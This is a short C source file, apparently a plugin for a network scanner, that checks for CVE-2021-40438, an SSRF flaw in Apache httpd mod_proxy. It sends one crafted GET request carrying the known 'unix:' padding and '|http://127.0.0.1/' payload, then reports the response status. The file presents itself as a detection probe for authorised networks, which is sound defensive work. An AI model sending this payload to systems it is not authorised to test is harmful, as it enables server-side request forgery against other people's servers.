/* http-check-cve2021-40438-4 - Apache httpd mod_proxy SSRF
 * (CVE detection probe; benign request, verify out-of-band).
 * Use only on networks you own or have permission to scan.
 */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    char resp[8192];
    int n;

    if (!ar_valid(ctx)) {
        return 1;
    }
    n = ar_http_request(ctx, "GET", "/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://127.0.0.1/", NULL, NULL, NULL,
                        NULL, resp, sizeof(resp));
    if (n <= 0) {
        ar_out(ctx, "http-check-cve2021-40438-4: no HTTP response");
        return 0;
    }
    ar_out(ctx, "probe sent: GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [%d] (CVE2021-40438; verify out-of-band)",
           ar_http_status(resp));
    return 0;
}
